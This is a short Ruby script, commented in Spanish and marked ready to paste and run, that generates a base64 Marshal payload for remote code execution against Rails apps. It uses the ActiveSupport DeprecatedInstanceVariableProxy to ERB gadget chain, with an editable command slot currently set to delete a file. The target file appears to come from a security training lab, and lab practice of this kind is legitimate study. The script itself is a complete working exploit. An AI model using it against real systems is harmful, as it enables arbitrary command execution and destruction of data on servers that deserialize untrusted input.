# Rails Marshal RCE — pegar y correr:  ruby serialize_rails.rb
# Gadget: ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy -> ERB#result
require "base64"
require "erb"

command = "rm /home/carlos/morale.txt"   # <-- comando a ejecutar

erb = ERB.allocate
erb.instance_variable_set :@src, "`#{command}`"   # backticks = ejecuta el comando
erb.instance_variable_set :@filename, "1"
erb.instance_variable_set :@lineno, 0

module ActiveSupport; class Deprecation; class DeprecatedInstanceVariableProxy; end; end; end

proxy = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.allocate
proxy.instance_variable_set :@instance, erb
proxy.instance_variable_set :@method, :result
proxy.instance_variable_set :@var, "@result"
proxy.instance_variable_set :@deprecator, ActiveSupport::Deprecation.allocate

puts Base64.strict_encode64(Marshal.dump(proxy))
